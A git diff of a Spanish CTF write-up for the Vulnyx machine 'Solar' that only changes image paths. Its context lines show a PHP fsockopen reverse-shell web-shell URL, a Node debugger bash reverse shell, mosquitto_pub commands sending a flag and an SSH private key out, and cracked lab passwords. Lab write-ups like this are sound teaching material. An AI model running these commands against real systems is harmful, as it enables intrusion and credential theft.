@@ -5,7 +5,7 @@ title: WriteUp Solar - Vulnyx
 slug: solar-writeup-vulnyx-es  
 featured: false  
 draft: false  
-ogImage: "assets/solar/OpenGraph.png"  
+ogImage: "../../../assets/images/solar/OpenGraph.png"  
 tags:  
   - writeup  
   - vulnyx
@@ -29,7 +29,7 @@ A continuación, se describe el proceso esperado para la vulneración del CTF So
 
 Espero que sea de vuestro agrado.
 
-![Solar ASCII Art](/assets/solar/image.png)
+![Solar ASCII Art](../../../assets/images/solar/image.png)
 
 ## Tabla de contenido 
 
@@ -99,11 +99,11 @@ Si intentamos acceder al puerto 80, se nos dirige a `https://www.solar.nyx`, per
 
 **www.solar.nyx**
 
-![www.solar.nyx](/assets/solar/image-1.png)
+![www.solar.nyx](../../../assets/images/solar/image-1.png)
 
 **www.sunfriends.nyx**
 
-![www.sunfriends.nyx](/assets/solar/image-2.png)
+![www.sunfriends.nyx](../../../assets/images/solar/image-2.png)
 
 ### Fuzzing
 
@@ -228,7 +228,7 @@ En poco tiempo obtenemos la contraseña `emily`, por lo que accedemos al formula
 
 Analizamos el código de https://www.solar.nyx/dashboard.php.
 
-![www.solar.nyx/dashboard.php](/assets/solar/image-3.png)
+![www.solar.nyx/dashboard.php](../../../assets/images/solar/image-3.png)
 
 
 ```html
@@ -388,15 +388,15 @@ Nos conectamos al servidor mediante un cliente MQTT y nos suscribimos al topic `
 https://mqttx.app/downloads
 https://github.com/emqx/MQTTX
 
-![Configuración MQTT user](/assets/solar/image-4.png)
+![Configuración MQTT user](../../../assets/images/solar/image-4.png)
 
 Vemos que empezamos a recibir en el cliente MQTT los mismos datos que en el dashboard.
 
-![alt text](/assets/solar/image-4-old.png)
+![alt text](../../../assets/images/solar/image-4-old.png)
 
 Si publicamos datos en el topic `data`, veremos cómo se reflejan en el `dashboard.php`.
 
-![alt text](/assets/solar/image-5-old.png) 
+![alt text](../../../assets/images/solar/image-5-old.png) 
 
 Enviamos un dato de consumo muy alto y vemos cómo las barras del gráfico se mueven. En el código de la página, observamos que podemos realizar un XSS (Cross-Site Scripting), ya que se utiliza solo `innerHTML` sin sanitizar el contenido de las propiedades `solarEnergy` y `consumedEnergy` del JSON enviado.
 
@@ -793,7 +793,7 @@ cat base64pdf1.txt | base64 -d > document.pdf
 
 Si visualizamos el documento, podremos ver la inyección XSS enviada.
 
-![PDF XSS](/assets/solar/image-6.png)
+![PDF XSS](../../../assets/images/solar/image-6.png)
 
 ```bash
 ─$ exiftool document.pdf     
@@ -903,7 +903,7 @@ $ cat base64pdf3.txt | base64 -d > document3.pdf
 
 Lo abrimos y obtenemos otro código base64, esta vez del fichero PHP cargado localmente por el servidor.
 
-![alt text](/assets/solar/image-7.png)
+![alt text](../../../assets/images/solar/image-7.png)
 
 ### Paso 5
 
@@ -978,29 +978,29 @@ if (PHP_VERSION_ID < 70300) {
 }
 ...
 ```
-![Admin Login](/assets/solar/image-8.png)
+![Admin Login](../../../assets/images/solar/image-8.png)
 
 ## RCE
 
 Analizando el código fuente de `/var/www/sunfriends.nyx/server.php`, observamos que las credenciales del usuario son utilizadas para la validación del formulario y para la conexión al servicio MQTT.
 
-![Server Administration Panel](/assets/solar/image-10.png)
+![Server Administration Panel](../../../assets/images/solar/image-10.png)
 
 Accedemos a `https://www.sunfriends.nyx/server.php` con las credenciales obtenidas `5up3r:bloods`, también nos conectamos al servidor MQTT con las mismas credenciales y nos suscribimos a todos los topics `#`.
 
-![MQTTX Config](/assets/solar/image-5.png)
+![MQTTX Config](../../../assets/images/solar/image-5.png)
 
 Podemos observar que obtenemos todos los mensajes de los topics `data` y `record`, y cuando ejecutamos un comando también del topic `server/command/output`.
 
-![alt text](/assets/solar/image-11.png)
+![alt text](../../../assets/images/solar/image-11.png)
 
 Intentamos publicar datos en diferentes topics como `server/command/info`, `server/command/add`, `server/command/new`, ... y cuando publicamos en **server/command/new**, recibimos un mensaje que no hemos enviado en el topic `server/command/error`.
 
-![command](/assets/solar/image-28.png)
+![command](../../../assets/images/solar/image-28.png)
 
 Agregamos el parámetro **name** al JSON enviado al topic `server/command/new`.
 
-![command2](/assets/solar/image-29.png)
+![command2](../../../assets/images/solar/image-29.png)
 
 También agregamos el parámetro `cmd` y ya no recibimos ningún error. 
 
@@ -1044,7 +1044,7 @@ https://www.solar.nyx/records/shell.php?cmd=php%20-r%20%27%24sock%3Dfsockopen%28
 
 Ya tenemos `shell` con `www-data`.
 
-![alt text](/assets/solar/image-13.png)
+![alt text](../../../assets/images/solar/image-13.png)
 
 ## www-data a Lenam
 
@@ -1074,7 +1074,7 @@ Encontramos la flag `/home/lenam/user.txt` y también algunas claves SSH. Nos su
 doas -u lenam /usr/bin/mosquitto_pub -L mqtt://5up3r:bloods@localhost:1883/filtrate -f /home/lenam/user.txt
 doas -u lenam /usr/bin/mosquitto_pub -L mqtt://5up3r:bloods@localhost:1883/filtrate -f /home/lenam/.ssh/id_ed25519
 ```
-![alt text](/assets/solar/image-14.png)
+![alt text](../../../assets/images/solar/image-14.png)
 
 La clave está encriptada y el `passphrase` es fuerte; no está en `rockyou.txt`.
 
@@ -1190,11 +1190,11 @@ Lo enviamos al servidor MQTT:
 doas -u lenam /usr/bin/mosquitto_pub -L mqtt://5up3r:bloods@localhost:1883/filtrate -f /home/lenam/.local/share/nano/search_history
 ```
 
-![Passphrase filtrado](/assets/solar/image-15.png)
+![Passphrase filtrado](../../../assets/images/solar/image-15.png)
 
 Entramos con la clave SSH del usuario lenam y el passphrase `CzMO48xpwof8nvQ6JUhF` por SSH.
 
-![SSH Lenam](/assets/solar/image-16.png)
+![SSH Lenam](../../../assets/images/solar/image-16.png)
 
 ## De lenam a julian
 
@@ -1210,13 +1210,13 @@ permit setenv { PATH } julian as root cmd /usr/local/bin/backups
 
 Encontramos la carpeta `/home/lenam/.password-store` donde se suelen almacenar las contraseñas de `pass`, un gestor de contraseñas.
 
-![pass test](/assets/solar/image-17.png)
+![pass test](../../../assets/images/solar/image-17.png)
 
 Podemos ver que el usuario lenam lo utiliza y tiene almacenadas varias contraseñas. No las podemos ver porque nos pide un passphrase para visualizarlas. No sirve el passphrase que tenemos de la clave utilizada en el SSH. Normalmente, este software utiliza una clave GPG para proteger el vault.
 
 Encontramos 2 claves GPG en la carpeta `/home/lenam/.gnupg/private-keys-v1.d/`.
 
-![alt text](/assets/solar/image-18.png)
+![alt text](../../../assets/images/solar/image-18.png)
 
 ### Cracking GPG 2.2
 
@@ -1463,7 +1463,7 @@ debug> exec("process.mainModule.require('child_process').exec('bash -c \"/bin/ba
 
 Obtenemos una `revshell` con el usuario `julian`.
 
-![revshell julian](/assets/solar/image-19.png)
+![revshell julian](../../../assets/images/solar/image-19.png)
 
 ## De julian a root
 
@@ -1483,7 +1483,7 @@ El usuario `julian` puede ejecutar el binario `/usr/local/bin/backups` como `roo
 
 Encontramos una imagen JPG en la carpeta del usuario. La traemos a nuestra máquina mediante `curl` y el módulo de Python `uploadserver`. 
 
-![uploadserver](/assets/solar/image-20.png)
+![uploadserver](../../../assets/images/solar/image-20.png)
 
 Con `stegcracker` y `rockyou.txt`, en unos pocos segundos averiguamos la contraseña `teresa` y extraemos la información.
 
@@ -1528,7 +1528,7 @@ https://malbolge.doleczek.pl/
 
 Copiamos el texto del programa `Malbolge` encontrado en la imagen y lo ejecutamos.
 
-![julian password](/assets/solar/image-21.png)
+![julian password](../../../assets/images/solar/image-21.png)
 
 Encontramos la contraseña del usuario `julian`: `tk8QaHUi3XaMLYoP1BpZ`.
 
@@ -1658,11 +1658,11 @@ Nos dirigimos a [CyberChef](https://gchq.github.io/CyberChef/) y utilizamos la `
 
 Después de un rato calculando, CyberChef hace magia y descubre que está codificado en hexadecimal y después en XOR con la clave `69`.
 
-![CyberChef 1](/assets/solar/image-22.png)
+![CyberChef 1](../../../assets/images/solar/image-22.png)
 
 Nos descubre el nombre de una librería `libbackup.so`. Hacemos lo mismo con el otro código más largo `0a1b0c081d0c360a0604191b0c1a1a0c0d360b080a021c19`, que está codificado de la misma forma con la misma clave XOR.
 
-![CyberChef 2](/assets/solar/image-23.png)
+![CyberChef 2](../../../assets/images/solar/image-23.png)
 
 Ya tenemos el nombre de una librería `libbackup.so` y lo que parece ser el nombre de una función `create_compressed_backup`.
 
